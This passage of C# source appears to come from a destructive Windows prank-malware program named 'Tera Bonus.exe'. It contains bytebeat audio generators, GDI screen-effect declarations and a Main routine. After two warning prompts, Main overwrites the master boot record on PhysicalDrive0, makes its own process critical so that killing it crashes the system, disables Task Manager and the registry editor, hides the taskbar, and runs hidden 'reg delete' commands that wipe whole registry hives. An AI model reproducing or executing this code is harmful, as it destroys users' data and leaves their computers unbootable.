                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    (t%32767>>5) * Math.Sin("1511215191511243543"[(t >> 13) % 16] * t)
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte19(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    (t % 32767 >> 5) * Math.Sin(t*(t>>9|9))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
        private static void byte20(int hz, int secs)
        {
            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                    (t % 32767 >> 3) * Math.Sin(t * (1 + (5 & t >> 10)) * (3 + (Convert.ToBoolean(t >> 17 & 1) ? (2 ^ 2 & t >> 14) / 3 : 3 & (t >> 13) + 1)) >> (3 & t >> 9))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern bool ShowWindow(int hWnd, int cmdShow);


        private const int SW_HIDE = 0x0000;
        private const int SW_SHOW = 0x0001;
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        [STAThread]
        private static void Main()
        {
            Random random = new Random();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Drawer redrawer = new ReDrawer();
            Drawer rdrawer = new randomdrawer();
            Drawer rdrawer1 = new randomdrawer1();
            Drawer movewin = new Window();
            Drawer movecur = new Cur();
            Drawer textwin = new Windowtext();
            Drawer typewin = new Type();
            Drawer Openwin = new Open();
            Drawer sendm = new SendM();
            Drawer cfile = new createfiles();
            Drawer mbox = new msg();
            Drawer b = new bb();
            Drawer en = new ends();
            if (MessageBox.Show("Run Malware?", "Tera Bonus.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
            {
                if (MessageBox.Show("Are you sure?", "Last Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
                {
                    var mbrData = new byte[] {0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xFF, 0x8E, 0xDF,
        0xD9, 0x06, 0x7B, 0x7C, 0xBD, 0xC8, 0x00, 0xD9, 0x06, 0x7B, 0x7C, 0xBA, 0x40, 0x01, 0xD9, 0xEE,
        0xD9, 0xEE, 0xB0, 0x64, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3,
        0xD9, 0xC1, 0xD9, 0xC3, 0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0,
        0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0x87, 0x7C, 0x83, 0x3E, 0x87, 0x7C,
        0x04, 0x7D, 0x04, 0xFE, 0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06,
        0x73, 0x7C, 0x4A, 0x75, 0xB9, 0xDD, 0xD8, 0xD8, 0x06, 0x77, 0x7C, 0x4D, 0x75, 0xA9, 0x46, 0xDD,
        0xD8, 0xEB, 0x99, 0x9A, 0x99, 0x19, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0xBF, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};
                    var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                        OpenExisting, 0, IntPtr.Zero);
                    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);



                    int isCritical = 1;  // we want this to be a Critical Process
                    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    try
                    {
                        RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                        distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    }
                    catch { }
                    try
                    {
                        RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                        disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                    }
                    catch { }
                    try
                    {
                        int hwnd = FindWindow("Shell_TrayWnd", "");
                        ShowWindow(hwnd, SW_HIDE);
                    }
                    catch { }

                    Thread.Sleep(3000);
                    mbox.Start();
                    en.Start();
                    try
                    {
                        string command = @"reg delete HKCR /f";

                        var startInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/C " + command,
                            Verb = "runas",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };

                        Process.Start(startInfo);
                    }
                    catch { }
                    try
                    {
                        string command = @"reg delete HKU /f";

                        var startInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/C " + command,
                            Verb = "runas",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };

                        Process.Start(startInfo);
                    }
                    catch { }
                    try
                    {
                        string command = @"reg delete HKCC /f";

                        var startInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/C " + command,
                            Verb = "runas",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };

                        Process.Start(startInfo);
                    }
                    catch { }
                    try
                    {
                        int hwnd = FindWindow("Shell_TrayWnd", "");
                        ShowWindow(hwnd, SW_HIDE);
                    }
                    catch { }
                    if (IsAdministrator() == false)
                    {
                        MessageBox.Show("Run as Administrator", "Run as Admin", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Environment.Exit(0);
                    }

                    Thread.Sleep(2000);
                    redrawer.Start();
                    rdrawer.Start();
                    rdrawer1.Start();
                    b.Start();
                    movewin.Start();
                    movecur.Start();
                    textwin.Start();
                    typewin.Start();
                    Openwin.Start();
                    sendm.Start();
                    cfile.Start();
                }
            }
        }

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateSolidBrush(uint crColor);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject([In] IntPtr hObject);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

        [DllImport("user32.dll")]
        private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

        [System.Runtime.InteropServices.DllImportAttribute("msimg32.dll", EntryPoint = "AlphaBlend")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool AlphaBlend(System.IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, System.IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, _BLENDFUNCTION ftn);

        [System.Runtime.InteropServices.StructLayoutAttribute(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct _BLENDFUNCTION
        {

            /// BYTE->char
            public byte BlendOp;

            /// BYTE->char
            public byte BlendFlags;

            /// BYTE->char
            public byte SourceConstantAlpha;

            /// BYTE->char
            public byte AlphaFormat;
        }
        public const int AC_SRC_OVER = 0;

        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
       int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
       int yMask);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);
        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020, /* dest = source*/
            SRCPAINT = 0x00EE0086, /* dest = source OR dest*/
            SRCAND = 0x008800C6, /* dest = source AND dest*/
            SRCINVERT = 0x00660046, /* dest = source XOR dest*/
            SRCERASE = 0x00440328, /* dest = source AND (NOT dest )*/
            NOTSRCCOPY = 0x00330008, /* dest = (NOT source)*/
            NOTSRCERASE = 0x001100A6, /* dest = (NOT src) AND (NOT dest) */
            MERGECOPY = 0x00C000CA, /* dest = (source AND pattern)*/
            MERGEPAINT = 0x00BB0226, /* dest = (NOT source) OR dest*/
            PATCOPY = 0x00F00021, /* dest = pattern*/
            PATPAINT = 0x00FB0A09, /* dest = DPSnoo*/
            PATINVERT = 0x005A0049, /* dest = pattern XOR dest*/
            DSTINVERT = 0x00550009, /* dest = (NOT dest)*/
            BLACKNESS = 0x00000042, /* dest = BLACK*/
            WHITENESS = 0x00FF0062, /* dest = WHITE*/
        };
        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Gdi32", EntryPoint = "GetBitmapBits")]
        public unsafe extern static long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, [Out] IntPtr lpvBits);
        [DllImport("gdi32.dll")]
        public static extern unsafe int SetBitmapBits(IntPtr hbmp, int cBytes, IntPtr lpvBits);

        [DllImport("gdi32.dll")]
        public unsafe static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public unsafe struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect,
    int nRightRect, int nBottomRect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
    IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;


        [DllImport("user32.dll")]
        private static extern int GetFocus();

        [DllImport("user32.dll")]
        private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(int hWnd, int ProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SendMessage(int hWnd, int Msg, int wParam, StringBuilder lParam);
    }
}
